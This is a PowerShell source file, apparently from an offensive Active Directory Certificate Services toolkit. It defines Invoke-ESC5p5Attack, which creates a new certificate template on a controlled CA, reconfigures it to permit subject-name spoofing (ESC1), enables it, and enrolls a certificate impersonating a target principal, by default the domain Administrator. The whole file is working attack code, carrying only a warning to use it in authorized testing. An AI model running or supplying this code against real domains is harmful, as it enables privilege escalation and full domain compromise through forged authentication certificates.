function Invoke-ESC5p5Attack {
    <#
        .SYNOPSIS
        Performs an ESC5p5 attack by creating new vulnerable templates, enabling them on CAs, and executing the attack.

        .DESCRIPTION
        This function takes the output from Find-ESC5p5Combo (ESC5 certificate template container + enrollment service combinations),
        creates new certificate templates using New-BlankTemplateObject, configures them using Set-TemplateProperty,
        converts them to ESC1 vulnerabilities using ConvertTo-ESC1, enables them on the controlled Certificate Authorities
        using Enable-Template, and then executes the ESC1 attack using Invoke-ESC1Attack.
        
        ESC5p5 attacks exploit complete control over PKI infrastructure:
        1. Control over certificate template containers (ESC5 CertTemplatesContainer)
        2. Control over enrollment services/Certificate Authorities (ESC5 EnrollmentService)
        
        The attack process:
        1. Create a new blank certificate template using New-BlankTemplateObject
        2. Configure basic template properties using Set-TemplateProperty
        3. Convert the template to be ESC1 vulnerable (allow SAN spoofing) using ConvertTo-ESC1
        4. Enable the template on the controlled Certificate Authority using Enable-Template
        5. Execute the ESC1 attack to obtain a certificate impersonating a target principal
        6. Use the certificate to authenticate as the target principal

        .PARAMETER ESC5p5Result
        A result object from Find-ESC5p5Combo containing ESC5 certificate template container + enrollment service combinations.
        The object should have CertTemplatesContainers, EnrollmentServices, ESC5CertTemplatesIssues, and ESC5EnrollmentIssues properties.

        .PARAMETER TargetPrincipal
        DirectoryEntry object representing the security principal to impersonate in the certificate.
        If not specified, automatically discovers and uses the domain Administrator account (RID 500).

        .PARAMETER TemplateNamePrefix
        Prefix for the new template names that will be created. Defaults to "ESCalatorESC5p5".
        A timestamp will be appended to ensure uniqueness.

        .PARAMETER WhatIf
        Shows what attack would be performed without actually executing template creation, configuration, enablement, or attack.

        .INPUTS
        PSCustomObject
        ESC5p5 result objects from Find-ESC5p5Combo function.

        .OUTPUTS
        PSCustomObject[]
        Returns attack results for each template/CA combination that was created and attacked.

        .EXAMPLE
        # Find ESC5p5 vulnerabilities and attack them
        $esc5p5Results = Find-ESC5p5Combo -Issues $AllIssues
        $esc5p5Results | Invoke-ESC5p5Attack

        .EXAMPLE
        # Attack with specific target principal and custom template prefix
        $targetUser = Resolve-Principal -Identity "Administrator"
        $esc5p5Results = Find-ESC5p5Combo -Issues $AllIssues
        Invoke-ESC5p5Attack -ESC5p5Result $esc5p5Results[0] -TargetPrincipal $targetUser -TemplateNamePrefix "CustomAttack"

        .EXAMPLE
        # Use WhatIf to see what would happen
        $esc5p5Results = Find-ESC5p5Combo -Issues $AllIssues
        Invoke-ESC5p5Attack -ESC5p5Result $esc5p5Results[0] -WhatIf

        .NOTES
        WARNING: This function performs actual certificate attacks that can compromise security.
        Only use in authorized penetration testing or red team exercises.
        
        Requires:
        - No external tools; enrollment + PKINIT are pure PowerShell (vendored PSPkinit).
        - Network access to Certificate Authority
        - Appropriate permissions to create certificate templates
        - Appropriate permissions to modify CA configurations
        - Appropriate permissions to enroll certificates

        .LINK
        https://posts.specterops.io/certified-pre-owned-d95910965cd2
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [ValidateNotNull()]
        [PSCustomObject]$ESC5p5Result,

        [Parameter()]
        [System.DirectoryServices.DirectoryEntry]$TargetPrincipal,
        
        [Parameter()]
        [string]$TemplateNamePrefix = "ESCalatorESC5p5"
    )

    #requires -Version 7.4

    begin {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."

        # Initialize results array
        $attackResults = @()
        
        # Get all ADCS objects for CA lookups
        Write-Verbose "Getting AD CS objects for CA DirectoryEntry lookups..."
        try {
            $AdcsObjects = Get-AdcsObjects
            Write-Verbose "Retrieved $($AdcsObjects.Count) AD CS objects"
        } catch {
            throw "Failed to get AD CS objects: $($_.Exception.Message)"
        }
    }

    process {
        Write-Verbose "Processing ESC5p5 result for principal: $($ESC5p5Result.PrincipalName)"
        
        # Validate input object structure
        if (-not $ESC5p5Result.PSObject.Properties['ESC5CertTemplatesIssues'] -or 
            -not $ESC5p5Result.PSObject.Properties['ESC5EnrollmentIssues'] -or
            -not $ESC5p5Result.PSObject.Properties['CertTemplatesContainers'] -or
            -not $ESC5p5Result.PSObject.Properties['EnrollmentServices']) {
            Write-Warning "Invalid ESC5p5Result object. Expected properties: ESC5CertTemplatesIssues, ESC5EnrollmentIssues, CertTemplatesContainers, EnrollmentServices"
            return
        }
        
        if ($ESC5p5Result.ESC5CertTemplatesIssues.Count -eq 0 -or $ESC5p5Result.ESC5EnrollmentIssues.Count -eq 0) {
            Write-Warning "No ESC5 certificate template or enrollment issues found in result object for principal: $($ESC5p5Result.PrincipalName)"
            return
        }
        
        Write-Host "=== ESC5p5 Attack: $($ESC5p5Result.PrincipalName) ===" -ForegroundColor Red
        Write-Host "Found $($ESC5p5Result.ESC5CertTemplatesIssues.Count) certificate template container(s): $($ESC5p5Result.CertTemplatesContainers -join ', ')" -ForegroundColor Yellow
        Write-Host "Found $($ESC5p5Result.ESC5EnrollmentIssues.Count) controlled enrollment service(s): $($ESC5p5Result.EnrollmentServices -join ', ')" -ForegroundColor Yellow
        Write-Host ""
        
        # Create unique template names for each enrollment service
        $timestamp = Get-Date -Format "yyyyMMddHHmmss"
        $templateCounter = 1
        
        # Process each controlled enrollment service (we only need one template per CA)
        foreach ($serviceName in $ESC5p5Result.EnrollmentServices) {
            $templateName = "$TemplateNamePrefix$timestamp$templateCounter"
            $templateCounter++
            
            Write-Host "Creating and attacking template: $templateName via CA: $serviceName" -ForegroundColor Cyan
            
            # Find the corresponding ESC5 enrollment service issue
            $serviceIssue = $ESC5p5Result.ESC5EnrollmentIssues | Where-Object { $_.Name -eq $serviceName } | Select-Object -First 1
            
            if (-not $serviceIssue) {
                Write-Warning "Could not find ESC5 enrollment issue for service: $serviceName"
                continue
            }
            
            # Find the CA DirectoryEntry object from ADCS objects
            $caDirectoryEntry = $AdcsObjects | Where-Object { 
                $_.ObjectClass -eq 'pKIEnrollmentService' -and $_.Properties['name'].Value -eq $serviceName 
            } | Select-Object -First 1
            
            if (-not $caDirectoryEntry) {
                Write-Warning "Could not find DirectoryEntry for CA: $serviceName"
                continue
            }
            
            try {
                Write-Host "  Step 1: Creating new blank certificate template..." -ForegroundColor Yellow
                
                if ($PSCmdlet.ShouldProcess("Template: $templateName", "Create new blank template")) {
                    # Create a new blank certificate template
                    $newTemplate = New-BlankTemplateObject -TemplateName $templateName
                    
                    if ($newTemplate) {
                        Write-Host "  [+] Successfully created blank template: $templateName" -ForegroundColor Green
                        
                        Write-Host "  Step 2: Configuring template properties..." -ForegroundColor Yellow
                        
                        # Configure the template with basic properties
                        $configResult = Set-TemplateProperty -TemplateName $templateName -Description "ESCalator ESC5p5 Attack Template"
                        
                        if ($configResult -and $configResult.Success) {
                            Write-Host "  [+] Successfully configured template properties" -ForegroundColor Green
                            
                            # Refresh the template object to get updated properties
                            $newTemplate.RefreshCache()
                            
                            Write-Host "  Step 3: Converting template to ESC1 vulnerability..." -ForegroundColor Yellow
                            
                            # Convert the template to ESC1 vulnerable
                            $convertResult = ConvertTo-ESC1 -InputObject $newTemplate -PassThru
                            
                            if ($convertResult) {
                                Write-Host "  [+] Successfully converted template to ESC1" -ForegroundColor Green
                                
                                Write-Host "  Step 4: Enabling template on Certificate Authority..." -ForegroundColor Yellow
                                
                                # Enable the template on the controlled CA
                                $enableResult = Enable-Template -Template $convertResult -CertificateAuthority $caDirectoryEntry -PassThru
                                
                                if ($enableResult -and ($enableResult.Success -or $enableResult.Action -eq "Already Enabled")) {
                                    $enableAction = $enableResult.Action -or "Enabled"
                                    Write-Host "  [+] Successfully enabled template on CA ($enableAction)" -ForegroundColor Green
                                    
                                    Write-Host "  Step 5: Getting CA full name..." -ForegroundColor Yellow
                                    
                                    # Get the CA full name for certificate enrollment
                                    $caFullName = Get-CAFullName -CAObjects $caDirectoryEntry
                                    
                                    if ($caFullName) {
                                        Write-Host "  [+] CA full name: $caFullName" -ForegroundColor Green
                                        
                                        Write-Host "  Step 6: Executing ESC1 attack..." -ForegroundColor Yellow
                                        
                                        # Build parameters for Invoke-ESC1Attack
                                        $esc1Params = @{
                                            TemplateObject = $convertResult
                                            CertificateAuthority = $caFullName
                                        }
                                        
                                        # Add optional parameters if provided
                                        if ($TargetPrincipal) {
                                            $esc1Params.TargetPrincipal = $TargetPrincipal
                                        }
                                        
                                        # Execute the ESC1 attack
                                        $attackResult = Invoke-ESC1Attack @esc1Params
                                        
                                        if ($attackResult) {
                                            Write-Host "  [+] ESC1 attack completed successfully" -ForegroundColor Green
                                            
                                            # Create comprehensive result object
                                            $resultObject = [PSCustomObject]@{
                                                PSTypeName = 'ESC5p5_Attack_Result'
                                                PrincipalName = $ESC5p5Result.PrincipalName
                                                PrincipalSID = $ESC5p5Result.PrincipalSID
                                                TemplateName = $templateName
                                                CertificateAuthority = $serviceName
                                                CAFullName = $caFullName
                                                AttackType = "ESC5p5"
                                                CreationSuccess = $true
                                                ConfigurationSuccess = $true
                                                ConversionSuccess = $true
                                                EnablementSuccess = $true
                                                AttackSuccess = $true
                                                AttackResult = $attackResult
                                                TargetPrincipal = $TargetPrincipal
                                                Timestamp = Get-Date
                                                ErrorMessage = $null
                                            }
                                            
                                            $attackResults += $resultObject
                                            Write-Host "  [+] Attack result stored" -ForegroundColor Green
                                        } else {
                                            Write-Host "  [x] ESC1 attack failed or returned no result" -ForegroundColor Red
                                            
                                            $resultObject = [PSCustomObject]@{
                                                PSTypeName = 'ESC5p5_Attack_Result'
                                                PrincipalName = $ESC5p5Result.PrincipalName
                                                PrincipalSID = $ESC5p5Result.PrincipalSID
                                                TemplateName = $templateName
                                                CertificateAuthority = $serviceName
                                                CAFullName = $caFullName
                                                AttackType = "ESC5p5"
                                                CreationSuccess = $true
                                                ConfigurationSuccess = $true
                                                ConversionSuccess = $true
                                                EnablementSuccess = $true
                                                AttackSuccess = $false
                                                AttackResult = $null
                                                TargetPrincipal = $TargetPrincipal
                                                Timestamp = Get-Date
                                                ErrorMessage = "ESC1 attack failed or returned no result"
                                            }
                                            
                                            $attackResults += $resultObject
                                        }
                                    } else {
                                        Write-Host "  [x] Failed to get CA full name" -ForegroundColor Red
                                        
                                        $resultObject = [PSCustomObject]@{
                                            PSTypeName = 'ESC5p5_Attack_Result'
                                            PrincipalName = $ESC5p5Result.PrincipalName
                                            PrincipalSID = $ESC5p5Result.PrincipalSID
                                            TemplateName = $templateName
                                            CertificateAuthority = $serviceName
                                            CAFullName = $null
                                            AttackType = "ESC5p5"
                                            CreationSuccess = $true
                                            ConfigurationSuccess = $true
                                            ConversionSuccess = $true
                                            EnablementSuccess = $true
                                            AttackSuccess = $false
                                            AttackResult = $null
                                            TargetPrincipal = $TargetPrincipal
                                            Timestamp = Get-Date
                                            ErrorMessage = "Failed to get CA full name"
                                        }
                                        
                                        $attackResults += $resultObject
                                    }
                                } else {
                                    $errorMsg = if ($enableResult -and $enableResult.Error) { $enableResult.Error } else { "Failed to enable template on CA" }
                                    Write-Host "  [x] Failed to enable template on CA: $errorMsg" -ForegroundColor Red
                                    
                                    $resultObject = [PSCustomObject]@{
                                        PSTypeName = 'ESC5p5_Attack_Result'
                                        PrincipalName = $ESC5p5Result.PrincipalName
                                        PrincipalSID = $ESC5p5Result.PrincipalSID
                                        TemplateName = $templateName
                                        CertificateAuthority = $serviceName
                                        CAFullName = $null
                                        AttackType = "ESC5p5"
                                        CreationSuccess = $true
                                        ConfigurationSuccess = $true
                                        ConversionSuccess = $true
                                        EnablementSuccess = $false
                                        AttackSuccess = $false
                                        AttackResult = $null
                                        TargetPrincipal = $TargetPrincipal
                                        Timestamp = Get-Date
                                        ErrorMessage = if ($enableResult -and $enableResult.Error) { $enableResult.Error } else { "Failed to enable template on CA" }
                                    }
                                    
                                    $attackResults += $resultObject
                                }
                            } else {
                                Write-Host "  [x] Failed to convert template to ESC1" -ForegroundColor Red
                                
                                $resultObject = [PSCustomObject]@{
                                    PSTypeName = 'ESC5p5_Attack_Result'
                                    PrincipalName = $ESC5p5Result.PrincipalName
                                    PrincipalSID = $ESC5p5Result.PrincipalSID
                                    TemplateName = $templateName
                                    CertificateAuthority = $serviceName
                                    CAFullName = $null
                                    AttackType = "ESC5p5"
                                    CreationSuccess = $true
                                    ConfigurationSuccess = $true
                                    ConversionSuccess = $false
                                    EnablementSuccess = $false
                                    AttackSuccess = $false
                                    AttackResult = $null
                                    TargetPrincipal = $TargetPrincipal
                                    Timestamp = Get-Date
                                    ErrorMessage = "Failed to convert template to ESC1"
                                }
                                
                                $attackResults += $resultObject
                            }
                        } else {
                            $configError = if ($configResult -and $configResult.ErrorMessage) { $configResult.ErrorMessage } else { "Failed to configure template properties" }
                            Write-Host "  [x] Failed to configure template properties: $configError" -ForegroundColor Red
                            
                            $resultObject = [PSCustomObject]@{
                                PSTypeName = 'ESC5p5_Attack_Result'
                                PrincipalName = $ESC5p5Result.PrincipalName
                                PrincipalSID = $ESC5p5Result.PrincipalSID
                                TemplateName = $templateName
                                CertificateAuthority = $serviceName
                                CAFullName = $null
                                AttackType = "ESC5p5"
                                CreationSuccess = $true
                                ConfigurationSuccess = $false
                                ConversionSuccess = $false
                                EnablementSuccess = $false
                                AttackSuccess = $false
                                AttackResult = $null
                                TargetPrincipal = $TargetPrincipal
                                Timestamp = Get-Date
                                ErrorMessage = $configError
                            }
                            
                            $attackResults += $resultObject
                        }
                    } else {
                        Write-Host "  [x] Failed to create blank template" -ForegroundColor Red
                        
                        $resultObject = [PSCustomObject]@{
                            PSTypeName = 'ESC5p5_Attack_Result'
                            PrincipalName = $ESC5p5Result.PrincipalName
                            PrincipalSID = $ESC5p5Result.PrincipalSID
                            TemplateName = $templateName
                            CertificateAuthority = $serviceName
                            CAFullName = $null
                            AttackType = "ESC5p5"
                            CreationSuccess = $false
                            ConfigurationSuccess = $false
                            ConversionSuccess = $false
                            EnablementSuccess = $false
                            AttackSuccess = $false
                            AttackResult = $null
                            TargetPrincipal = $TargetPrincipal
                            Timestamp = Get-Date
                            ErrorMessage = "Failed to create blank template"
                        }
                        
                        $attackResults += $resultObject
                    }
                } else {
                    Write-Host "  [i] WhatIf: Would create template $templateName, configure it, convert to ESC1, enable on CA $serviceName, and execute attack" -ForegroundColor Gray
                    
                    $resultObject = [PSCustomObject]@{
                        PSTypeName = 'ESC5p5_Attack_Result'
                        PrincipalName = $ESC5p5Result.PrincipalName
                        PrincipalSID = $ESC5p5Result.PrincipalSID
                        TemplateName = $templateName
                        CertificateAuthority = $serviceName
                        CAFullName = $null
                        AttackType = "ESC5p5"
                        CreationSuccess = $null
                        ConfigurationSuccess = $null
                        ConversionSuccess = $null
                        EnablementSuccess = $null
                        AttackSuccess = $null
                        AttackResult = $null
                        TargetPrincipal = $TargetPrincipal
                        Timestamp = Get-Date
                        ErrorMessage = "WhatIf simulation"
                    }
                    
                    $attackResults += $resultObject
                }
                
            } catch {
                Write-Host "  [x] Error during ESC5p5 attack: $($_.Exception.Message)" -ForegroundColor Red
                Write-Verbose "Full error details: $($_.Exception | Format-List * | Out-String)"
                
                $resultObject = [PSCustomObject]@{
                    PSTypeName = 'ESC5p5_Attack_Result'
                    PrincipalName = $ESC5p5Result.PrincipalName
                    PrincipalSID = $ESC5p5Result.PrincipalSID
                    TemplateName = $templateName
                    CertificateAuthority = $serviceName
                    CAFullName = $null
                    AttackType = "ESC5p5"
                    CreationSuccess = $false
                    ConfigurationSuccess = $false
                    ConversionSuccess = $false
                    EnablementSuccess = $false
                    AttackSuccess = $false
                    AttackResult = $null
                    TargetPrincipal = $TargetPrincipal
                    Timestamp = Get-Date
                    ErrorMessage = $_.Exception.Message
                }
                
                $attackResults += $resultObject
            }
            
            Write-Host ""
        }
    }

    end {
        Write-Verbose "ESC5p5 attack processing complete. Processed $($attackResults.Count) template/CA combination(s)"
        
        if ($attackResults.Count -gt 0) {
            $successfulAttacks = ($attackResults | Where-Object { $_.AttackSuccess -eq $true }).Count
            $failedAttacks = ($attackResults | Where-Object { $_.AttackSuccess -eq $false }).Count
            $whatIfAttacks = ($attackResults | Where-Object { $null -eq $_.AttackSuccess }).Count
            
            Write-Verbose "Attack Summary:"
            Write-Verbose "  Successful attacks: $successfulAttacks"
            Write-Verbose "  Failed attacks: $failedAttacks"
            Write-Verbose "  WhatIf simulations: $whatIfAttacks"
            
            # Summary by phase
            $creationFailures = ($attackResults | Where-Object { $_.CreationSuccess -eq $false }).Count
            $configurationFailures = ($attackResults | Where-Object { $_.ConfigurationSuccess -eq $false }).Count
            $conversionFailures = ($attackResults | Where-Object { $_.ConversionSuccess -eq $false }).Count
            $enablementFailures = ($attackResults | Where-Object { $_.EnablementSuccess -eq $false }).Count
            
            Write-Verbose "Failure Analysis:"
            Write-Verbose "  Template creation failures: $creationFailures"
            Write-Verbose "  Template configuration failures: $configurationFailures"
            Write-Verbose "  Template conversion failures: $conversionFailures"
            Write-Verbose "  Template enablement failures: $enablementFailures"
        }
        
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
        
        # Return the attack results
        return $attackResults
    }
}